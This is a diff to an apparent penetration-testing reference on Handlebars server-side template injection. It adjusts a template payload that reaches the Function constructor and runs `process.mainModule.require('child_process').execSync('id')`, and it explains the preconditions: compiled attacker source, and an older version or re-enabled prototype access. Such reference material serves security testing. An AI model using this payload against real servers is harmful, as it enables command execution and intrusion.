@@ -22,7 +22,7 @@ The exploit uses `#with` to pin a reference, walks to `constructor.constructor`,
     {{this.pop}}
     {{#with string.split as |codelist|}}
       {{this.pop}}
-      {{this.push "return require('child_process').execSync('id').toString();"}}
+      {{this.push "return process.mainModule.require('child_process').execSync('id').toString();"}}
       {{this.pop}}
       {{#each conslist}}
         {{#with (string.sub.apply 0 codelist)}}
@@ -34,9 +34,13 @@ The exploit uses `#with` to pin a reference, walks to `constructor.constructor`,
 {{/with}}
 ```
 
-The chain reaches `String.prototype.sub`, pulls its `constructor` (the `Function` constructor), hands it the `return require('child_process')...` body, and applies it, so the command runs and its output is rendered. The payload is intricate because Handlebars offers no direct call syntax, but it is reliable against server-side Handlebars that renders attacker-controlled template source.
+The chain reaches `String.prototype.sub`, pulls its `constructor` (the `Function` constructor), and hands it the body to compile and run. Two preconditions decide whether it actually fires.
 
-The practical precondition is that the untrusted input is compiled as a template (`Handlebars.compile(userInput)`), not merely passed as data to a fixed template; data context is escaped and safe. When only the data is attacker-controlled, Handlebars is not injectable this way. Confirm the compile-source sink before investing in the payload.
+First, the module-scope detail: a function built by the `Function` constructor runs in the global scope, where `require` is not defined (in CommonJS `require` is module-scoped). The body therefore reaches a loader through the `process` global instead, `process.mainModule.require('child_process')`, rather than a bare `require(...)` that would raise `ReferenceError`.
+
+Second, the prototype-access restriction: since Handlebars 4.6.0 (2020), access to prototype methods and properties is denied by default, which stops this chain while it resolves `split`, `sub`, `pop`, or `constructor`. The payload is reliable only on older releases, or where the application explicitly re-enables prototype access (`allowProtoMethodsByDefault` / `allowProtoPropertiesByDefault`, or a custom `allowedProtoMethods` allowlist). On current Handlebars with default options it does not work merely because attacker-controlled source reaches `Handlebars.compile`.
+
+The baseline precondition still holds: the untrusted input must be compiled as a template (`Handlebars.compile(userInput)`), not passed as data to a fixed template, which is escaped and safe. Confirm the compile-source sink and the Handlebars version/options before investing in the payload.
 
 ## Tools
 
